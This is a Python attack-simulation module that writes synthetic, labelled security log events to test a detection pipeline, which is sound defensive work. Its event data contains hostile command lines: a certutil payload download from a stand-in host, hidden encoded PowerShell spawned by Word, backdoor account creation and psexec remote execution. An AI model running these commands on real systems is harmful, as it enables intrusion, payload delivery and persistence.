import uuid
from datetime import datetime, timedelta, timezone

from models import batch_insert_logs, insert_ground_truth, insert_simulation_run, update_simulation_run
from utils.normalizer import normalize_log

MB = 1024 * 1024

# All synthetic addresses are private or from the RFC 5737 documentation ranges, so no
# scenario ever labels a real system as an attacker. Nothing here sends network traffic:
# scenarios only write events into the local pipeline.


# Negative offsets are normal history from before the attack. They give the behavioral checks
# something to compare with, and ground truth labels them as normal.
BASELINE_LOGIN_GAPS = (5400, 4200, 3300, 2700, 1800, 1200, 600)
BASELINE_FLOW_GAPS = (5100, 4800, 4300, 4100, 3400, 3000, 2600, 2000, 1500, 1100, 900, 300)


def _auth(offset, ok, ip, user, host=None, dst=None):
    return (offset, 'application', {
        'event_type': 'authentication_success' if ok else 'authentication_failure',
        'src_ip': ip, 'dst_ip': dst, 'user': user, 'hostname': host, 'method': 'POST',
        'endpoint': '/api/v1/auth/login', 'status_code': 200 if ok else 401,
        'session_id': f'sess-{ip}' if ok else None,
        'details': f"{'Successful' if ok else 'Failed'} login for {user}",
    })


def _proc(offset, host, user, name, command=None, parent=None, event_type='process_start', details=None):
    return (offset, 'endpoint', {
        'event_type': event_type, 'hostname': host, 'user': user, 'process_name': name,
        'command_line': command, 'parent_process_name': parent, 'details': details or f'{name} started',
    })


def _conn(offset, host, src, dst, port, size=0, flags=None, status=None, protocol='TCP'):
    return (offset, 'network', {
        'event_type': 'network_connection', 'hostname': host, 'src_ip': src, 'dst_ip': dst,
        'src_port': 49152 + (offset % 10000), 'dst_port': port, 'protocol': protocol, 'bytes': size,
        'flags': flags, 'connection_status': status,
    })


def brute_force():
    """Ten failed logins, then a success from the same address"""
    ip = '203.0.113.10'
    return [_auth(i * 2, False, ip, 'admin', 'app-01') for i in range(10)] + [_auth(25, True, ip, 'admin', 'app-01')]


def credential_abuse():
    """Password spraying across accounts, ending in one successful login"""
    ip = '203.0.113.11'
    users = ['jsmith', 'mlee', 'rkumar', 'aparker', 'tchen', 'svc_backup']
    return [_auth(i * 5, False, ip, user, 'auth-01') for i, user in enumerate(users)] + [_auth(40, True, ip, 'jsmith', 'auth-01')]


def port_scan():
    """One host probing twenty ports on another"""
    return [_conn(i, 'wks-05', '10.20.0.50', '10.20.0.60', 20 + i, flags='S', status='attempted') for i in range(20)]


def privilege_escalation():
    """A deployment account opens a root shell and adds itself to the sudo group"""
    return [
        _proc(0, 'app-02', 'deploy', 'sudo', 'sudo su -'),
        _proc(30, 'app-02', 'deploy', 'usermod', 'usermod -aG sudo deploy'),
    ]


def account_creation():
    """An administrator session creates a new local account"""
    return [_proc(0, 'app-03', 'Administrator', 'net.exe', 'net user backdoor_admin Xy12 /add')]


def lateral():
    """Connections to several internal hosts on admin ports, plus a remote execution tool"""
    src = '10.30.0.7'
    events = [_conn(i * 5, 'wks-07', src, f'10.30.0.{20 + i}', port)
              for i, port in enumerate((445, 3389, 445, 22))]
    events.append(_proc(30, 'wks-07', 'it_admin', 'psexec.exe', r'psexec.exe \\10.30.0.20 cmd.exe'))
    return events


def suspicious_process():
    """Encoded PowerShell started from Word, then certutil downloading a payload"""
    return [
        _proc(0, 'wks-08', 'kpatel', 'powershell.exe', 'powershell.exe -nop -w hidden -enc SQBFAFgA', parent='winword.exe'),
        _proc(20, 'wks-08', 'kpatel', 'certutil.exe', 'certutil.exe -urlcache -f http://files.malware-demo.example/payload.bin p.exe'),
    ]


def cred_dump():
    """A credential theft tool reads LSASS memory"""
    return [_proc(0, 'wks-09', 'SYSTEM', 'mimikatz.exe', event_type='memory_access',
                  details='Access to lsass.exe memory space detected')]


def exfil():
    """An archive is accessed, then large transfers go to an address on the IOC feed"""
    # Older than the exfiltration rule's window, so that the rule's evidence is the attack alone
    baseline = [_conn(-gap, 'fin-02', '10.40.0.2', '198.51.100.41', 443, 15000 + gap * 5, protocol='HTTPS')
                for gap in BASELINE_FLOW_GAPS if gap >= 900]
    return baseline + [
        (0, 'endpoint', {'event_type': 'file_access', 'hostname': 'fin-02', 'user': 'analyst1',
                         'file_path': r'C:\Finance\Company_Financials_v2.zip', 'details': 'Archive file accessed'}),
        _conn(60, 'fin-02', '10.40.0.2', '198.51.100.77', 443, 40 * MB, protocol='HTTPS'),
        _conn(120, 'fin-02', '10.40.0.2', '198.51.100.77', 443, 40 * MB, protocol='HTTPS'),
    ]


def beacon():
    """Small connections at a nearly constant 60 second interval"""
    jitter = (0, 2, -1, 1, -2, 0)
    return [_conn(i * 60 + jitter[i], 'wks-11', '10.50.0.11', '198.51.100.200', 443, 512, protocol='HTTPS') for i in range(6)]


def webshell():
    """A script is uploaded, then the web server starts a shell"""
    return [
        (0, 'application', {'event_type': 'file_upload', 'src_ip': '203.0.113.12', 'hostname': 'web-02',
                            'method': 'POST', 'endpoint': '/upload/shell.php', 'status_code': 201,
                            'details': 'File upload to public directory'}),
        _proc(30, 'web-02', 'www-data', 'cmd.exe', 'cmd.exe /c whoami', parent='w3wp.exe'),
    ]


def low_signal():
    """One archive created on a workstation: a weak signal that is often legitimate"""
    return [_proc(0, 'wks-30', 'jdoe', '7z.exe', r'7z.exe a C:\Temp\q3_reports.7z C:\Reports')]


def multi_stage():
    """The full demonstration against the synthetic web-01 host"""
    attacker, victim, host, user = '203.0.113.50', '10.10.1.10', 'web-01', 'svc_admin'
    events = [_auth(-gap, True, '10.10.1.5', user, host, victim) for gap in BASELINE_LOGIN_GAPS]
    events += [_conn(-gap, host, victim, '198.51.100.40', 443, 20000 + gap * 7, protocol='HTTPS') for gap in BASELINE_FLOW_GAPS]
    events += [_auth(i * 3, False, attacker, user, host, victim) for i in range(12)]
    events.append(_auth(60, True, attacker, user, host, victim))
    events += [
        _proc(180, host, user, 'sudo', 'sudo su -'),
        _proc(240, host, user, 'net.exe', 'net user backup_svc Xy12 /add'),
        _proc(250, host, user, 'net.exe', 'net localgroup administrators backup_svc /add'),
    ]
    events += [_conn(420 + i * 10, host, victim, f'10.10.1.{20 + i}', port)
               for i, port in enumerate((445, 3389, 445, 22))]
    events.append(_proc(470, host, user, 'psexec.exe', r'psexec.exe \\10.10.1.20 cmd.exe'))
    events.append(_proc(600, host, user, '7z.exe', r'7z.exe a C:\Temp\export.7z C:\Finance'))
    events += [_conn(720 + i * 30, host, victim, '198.51.100.77', 443, 30 * MB, protocol='HTTPS') for i in range(3)]
    return events


def benign():
    """Normal activity that resembles attacks but should not raise any alert"""
    src = '10.60.0.5'
    return [
        # A mistyped password: below the brute force threshold
        _auth(0, False, src, 'dgarcia', 'hr-01'),
        _auth(20, False, src, 'dgarcia', 'hr-01'),
        _auth(40, True, src, 'dgarcia', 'hr-01'),
        # Ordinary tools, including names that only look like attack tools
        _proc(60, 'wks-20', 'dgarcia', 'dotnet.exe', 'dotnet build'),
        _proc(70, 'wks-20', 'dgarcia', 'powershell.exe', 'powershell.exe Get-Date'),
        _proc(80, 'wks-20', 'dgarcia', 'net.exe', 'net view'),
        _proc(90, 'srv-20', 'ops', 'sudo', 'sudo apt update'),
        # Large transfers to an internal server and to the approved backup destination
        _conn(100, 'wks-20', '10.60.0.20', '10.60.0.200', 445, 300 * MB),
        _conn(120, 'srv-20', '10.60.0.21', '198.51.100.10', 443, 200 * MB, protocol='HTTPS'),
        # Browsing with irregular timing, and admin access to a single server
        _conn(130, 'wks-20', '10.60.0.20', '198.51.100.40', 443, 2000, protocol='HTTPS'),
        _conn(137, 'wks-20', '10.60.0.20', '198.51.100.40', 443, 2000, protocol='HTTPS'),
        _conn(190, 'wks-20', '10.60.0.20', '198.51.100.40', 443, 2000, protocol='HTTPS'),
        _conn(200, 'wks-20', '10.60.0.20', '10.60.0.30', 22),
    ]


# Ground truth for each scenario: which detections it must produce and nothing else.
SCENARIOS = {
    'brute_force': {'name': 'Brute Force', 'build': brute_force, 'malicious': True,
                    'expected_rules': ['IOA-001', 'IOA-002']},
    'credential_abuse': {'name': 'Credential Abuse', 'build': credential_abuse, 'malicious': True,
                         'expected_rules': ['IOA-001', 'IOA-002', 'IOA-015']},
    'port_scan': {'name': 'Port Scanning', 'build': port_scan, 'malicious': True,
                  'expected_rules': ['IOA-005']},
    'privilege_escalation': {'name': 'Privilege Escalation', 'build': privilege_escalation, 'malicious': True,
                             'expected_rules': ['IOA-003']},
    'account_creation': {'name': 'Backdoor Account Creation', 'build': account_creation, 'malicious': True,
                         'expected_rules': ['IOA-004']},
    'lateral': {'name': 'Lateral Movement', 'build': lateral, 'malicious': True,
                'expected_rules': ['IOA-009', 'IOA-010']},
    'suspicious_process': {'name': 'Suspicious Process Execution', 'build': suspicious_process, 'malicious': True,
                           'expected_rules': ['IOA-008']},
    'cred_dump': {'name': 'Credential Dumping', 'build': cred_dump, 'malicious': True,
                  'expected_rules': ['IOA-011']},
    'exfil': {'name': 'Data Exfiltration', 'build': exfil, 'malicious': True,
              'expected_rules': ['IOA-007', 'IOA-016', 'IOC-IP', 'UEBA-002']},
    'beacon': {'name': 'C2 Beaconing', 'build': beacon, 'malicious': True,
               'expected_rules': ['IOA-014']},
    'webshell': {'name': 'Web Shell', 'build': webshell, 'malicious': True,
                 'expected_rules': ['IOA-012', 'IOA-013']},
    'multi_stage': {'name': 'Multi-Stage Attack', 'build': multi_stage, 'malicious': True,
                    'expected_rules': ['IOA-001', 'IOA-002', 'IOA-003', 'IOA-004', 'IOA-007',
                                       'IOA-009', 'IOA-010', 'IOA-016', 'IOC-IP', 'UEBA-001', 'UEBA-002']},
    'low_signal': {'name': 'Low-Risk Signal', 'build': low_signal, 'malicious': True, 'label': 'suspicious',
                   'expected_rules': ['IOA-016']},
    'benign': {'name': 'Benign Activity', 'build': benign, 'malicious': False, 'expected_rules': []},
}


def event_label(definition, offset):
    """What an event in a scenario really is. Stored apart from the event itself."""
    if not definition['malicious'] or offset < 0:
        return 'normal'
    return definition.get('label', 'malicious')


def build_scenario_events(scenario, run_id, end_time=None, first_sequence=0):
    """A scenario's events, stamped and labelled. Returns (raw, source, label) in time order.

    The last event is stamped end_time (default now) and the rest are spaced out behind it.
    """
    definition = SCENARIOS[scenario]
    events = sorted(definition['build'](), key=lambda item: item[0])
    end_time = end_time or datetime.now(timezone.utc)
    span = events[-1][0]
    built = []
    for sequence, (offset, source, fields) in enumerate(events, first_sequence):
        raw = {key: value for key, value in fields.items() if value is not None}
        raw['timestamp'] = (end_time - timedelta(seconds=span - offset)).isoformat()
        raw['event_id'] = f'{run_id}-{sequence:05d}'
        raw['synthetic'] = True
        built.append((raw, source, event_label(definition, offset)))
    return built


class AttackSimulator:
    """Generates reproducible synthetic scenarios and feeds them into the normal pipeline"""

    def list_scenarios(self):
        return [{'id': key, 'name': value['name'], 'description': (value['build'].__doc__ or value['name']).strip(),
                 'is_malicious': value['malicious'], 'expected_rules': value['expected_rules']}
                for key, value in SCENARIOS.items()]

    def run_scenario(self, scenario, end_time=None):
        """Store a scenario's events and record its ground truth at once. Returns the run details.
        The Simulation Lab's controlled runs go through utils/job_runner.py instead."""
        definition = SCENARIOS[scenario]
        run_id = f'sim-{uuid.uuid4().hex[:12]}'
        built = build_scenario_events(scenario, run_id, end_time)
        insert_ground_truth([(raw['event_id'], run_id, label, scenario) for raw, _, label in built])
        logs = [normalize_log(raw, source, origin='simulation', ingest_batch=run_id) for raw, source, _ in built]
        batch_insert_logs(logs)

        run = {'run_id': run_id, 'scenario': scenario, 'name': definition['name'],
               'is_malicious': definition['malicious'], 'expected_rules': definition['expected_rules'],
               'event_count': len(logs), 'started_at': datetime.now(timezone.utc).isoformat()}
        insert_simulation_run(run)
        update_simulation_run(run_id, {'processed_count': len(logs), 'completed_at': datetime.now(timezone.utc).isoformat()})
        return run

    def simulate_brute_force(self):
        return self.run_scenario('brute_force')

    def simulate_lateral_movement(self):
        return self.run_scenario('lateral')

    def simulate_exfiltration(self):
        return self.run_scenario('exfil')

    def simulate_c2_beaconing(self):
        return self.run_scenario('beacon')

    def simulate_webshell(self):
        return self.run_scenario('webshell')

    def simulate_cred_dump(self):
        return self.run_scenario('cred_dump')

    def simulate_account_creation(self):
        return self.run_scenario('account_creation')
